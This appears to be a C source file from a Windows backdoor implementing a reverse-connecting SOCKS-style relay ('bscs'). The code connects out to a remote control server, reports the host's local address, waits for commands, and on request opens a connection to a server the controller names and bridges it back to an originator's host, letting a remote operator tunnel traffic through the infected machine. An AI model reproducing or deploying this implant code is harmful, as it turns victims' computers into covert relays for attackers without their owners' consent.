#include "Stdafx.h"

DWORD WINAPI open_cl(LPVOID pbscs_conf)
{
	WSADATA wsaData;
	SOCKET c_socket;
	struct sockaddr_in service;
	struct msg_info *msginfo;
	struct cmd_syn_data *syndata;
	char *packet;
	char buffer[1024];
	int psize;
	int res;
	struct bscs_conf bscs_conf;
	char host[128];
	int  port;
	
	memcpy((void*) &bscs_conf, (void*) pbscs_conf, sizeof(struct bscs_conf));
	strcpy(host, bscs_conf.host);
	port = bscs_conf.port;
	
	udpdeb("bscs: connecting to remote bscs server %s:%d...", host, port);
	
	int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	
	if (iResult != NO_ERROR) 
	{
		deb("bscs: ocl: Error at WSAStartup()\n");
		ExitThread(ERR);
	}
	
	c_socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	
	if ( c_socket == INVALID_SOCKET ) 
	{
		deb( "ocl: Error at socket(): %ld\n", WSAGetLastError() );
		ExitThread(ERR);
	}
	
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = resolve(host);
	service.sin_port = htons( CONTROLPORT );
	
	if(connect(c_socket, (struct sockaddr*) &service, 
		sizeof(service)) == SOCKET_ERROR) {
		udpdeb("bscs: failed to connect... %s", FORMATERROR);
		return (DWORD) ERR;
	}
	
	udpdeb("bscs: connected to bscs server at %s:%d", 
		inet_ntoa(service.sin_addr), ntohs(service.sin_port));
	
	packet = mkinfo_packet(&psize);
	hexdump(packet + 1, psize - 1);
	
	deb("bscs: info packet size: %d buf at 0x%x", psize, packet);
	msginfo = (struct msg_info*) (packet + 1);
	deb("bscs: info packet ver  => %d", msginfo->version);
	deb("bscs: info packet host => %s", inet_ntoa(msginfo->host.sin_addr));
	
	res = send(c_socket, packet, psize, 0);
	hfree(packet);
	if(res != psize) {
		deb("bscs: send: %s res: %d", FORMATERROR, res);
		return (DWORD) ERR;
	}
	deb("bscs: sent info packet");
	
	packet = mkmsg_packet(&psize, MSG_READY);
	res = send(c_socket, packet, psize, 0);
	hfree(packet);
	if(res != psize) {
		deb("bscs: send: %s res: %d", FORMATERROR, res);
		return (DWORD) ERR;
	}
	deb("bscs: sent ready packet");
	udpdeb("bscs: ready for commands..");
	
	/* listening commands */
	for(;;) {
		res = recv(c_socket, buffer, sizeof(buffer), 0);
		if(res == SOCKET_ERROR || res == 0) {
			udpdeb("bscs: recv: %s res: %d", FORMATERROR, res);
			return (DWORD) ERR;
		}
		
		deb("bscs: read %d bytes", res);
		hexdump(buffer, res);
		
		switch((u_char) buffer[0]) {
		case CMD_SYN:
			deb("bscs: request for connect recieved");
			syndata = (struct cmd_syn_data*) (buffer + 1);
			process_connect_request(syndata);
			break;
		default:
			deb("bscs: unknown request %x", buffer[0]);
		}
	}
	
	return 0;
}

int process_connect_request(struct cmd_syn_data *psyndata)
{
	HANDLE hPCR;
	DWORD thread;
	
	hPCR = xCreateThread(NULL, 0, &pcr, (void *) psyndata, 0, &thread);
	if(hPCR == NULL) {
		udpdeb("bscs: failed to create pcr thread: %s", FORMATERROR);
		return (DWORD) ERR;
	}
	CloseHandle(hPCR);
	return 0;
}

DWORD WINAPI pcr(LPVOID psyndata)
{
	struct cmd_syn_data syndata;
	struct sockaddr_in sout, sin;
	SOCKET cli_socket, rem_socket;
	
	memcpy((void*) &syndata, psyndata, sizeof(struct cmd_syn_data));
	deb("bscs: syn: version: %d", syndata.version);
	udpdeb("bscs: syn: hostname: %s:%d", syndata.hostname, syndata.port);
	deb("bscs: syn: bhostname: %s", syndata.bhostname);
	deb("bscs: syn: bport: %d", syndata.bport);
	deb("bscs: syn: struct sockaddr_in addr: %s:%d",
		inet_ntoa(syndata.sin.sin_addr), ntohs(syndata.sin.sin_port));
	
	rem_socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	
	if ( rem_socket == INVALID_SOCKET ) {
		deb( "pcr: Error at socket(): %ld\n", WSAGetLastError() );
		ExitThread(ERR);
	}
	
	memset(&sin, 0, sizeof(sin));

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = syndata.sin.sin_addr.s_addr;
	sin.sin_port = syndata.sin.sin_port;

	if(connect(rem_socket, (struct sockaddr*) &sin, 
		sizeof(sin)) == SOCKET_ERROR) {
		udpdeb("bscs: failed to connect to asked server: %s", FORMATERROR);
		closesocket(rem_socket);
		ExitThread(ERR);
	}
	
	deb("bscs: connected to remote server %s:%d", 
		inet_ntoa(syndata.sin.sin_addr), ntohs(syndata.sin.sin_port));
	deb("bscs: connecting back to originator %s:%d", syndata.bhostname,
		syndata.bport);
	
	cli_socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	
	if ( cli_socket == INVALID_SOCKET ) {
		deb( "pcr: Error at socket(): %ld\n", WSAGetLastError() );
		closesocket(rem_socket);
		ExitThread(ERR);
	}
	
	sout.sin_addr.s_addr = resolve(syndata.bhostname);
	sout.sin_family = AF_INET;
	sout.sin_port = htons(syndata.bport);
	
	if(connect(cli_socket, (struct sockaddr*) &sout, 
		sizeof(sout)) == SOCKET_ERROR) {
		udpdeb("bscs: pcr: failed to connect back to originator: %s", 
			FORMATERROR);
		closesocket(rem_socket);
		closesocket(cli_socket);
		ExitThread(ERR);
	}
	
	deb("bscs: connected to originator.");
	deb("bscs: starting > BIO < sockets");
	
	sockets_bio(cli_socket, rem_socket);
	/*closesocket(rem_socket);
	closesocket(cli_socket);*/
	ExitThread(0);
}

char* mkinfo_packet(int *psize)
{
	char *packet;
	struct msg_info *msginfo;
	
	packet = (char*) halloc(sizeof(struct msg_info) + SIZEOF_HEADERS);
	if(packet == NULL) {
		deb("bscs: failed to alloc %d bytes for msginfo packet", 
			sizeof(struct msg_info) + SIZEOF_HEADERS);
		return NULL;
	}
	
	memset(packet, 0, sizeof(struct msg_info) + SIZEOF_HEADERS);
	packet[0] = (char) MSG_INFO;
	msginfo = (struct msg_info*) (packet + 1);
	
	msginfo->host.sin_addr.s_addr = resolve(GetLocalInetAddr());
	msginfo->version = BACK_SOCKS_VERSION;
	
	*(psize) = sizeof(struct msg_info) + SIZEOF_HEADERS;
	return packet;
}

char* mkmsg_packet(int *psize, u_char msg)
{
	char *packet;
	
	packet = (char*) halloc(SIZEOF_HEADERS);
	if(packet == NULL) {
		deb("bscs: failed to alloc %d bytes for msginfo packet", 
			SIZEOF_HEADERS);
		return NULL;
	}
	
	memset(packet, 0, SIZEOF_HEADERS);
	packet[0] = msg;
	
	*(psize) = SIZEOF_HEADERS;
	return packet;
}